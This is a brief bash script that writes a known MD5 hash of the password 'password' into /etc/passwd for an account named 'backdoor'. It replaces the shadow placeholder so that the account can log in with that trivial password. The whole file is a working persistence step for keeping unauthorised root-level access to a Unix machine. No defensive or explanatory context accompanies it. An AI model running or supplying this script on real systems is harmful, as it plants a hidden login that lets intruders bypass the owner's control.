#!/bin/bash

# md5 hash for 'password'
#
# $ openssl passwd password

KNOWN_HASH='$1$rTpwIewp$ku6Ad5IB7cAuLnfL30h8k0'

# Replace the 'x' shadow reference with a real hash
sed -i "s/^backdoor:x:/backdoor:$KNOWN_HASH:/" /etc/passwd

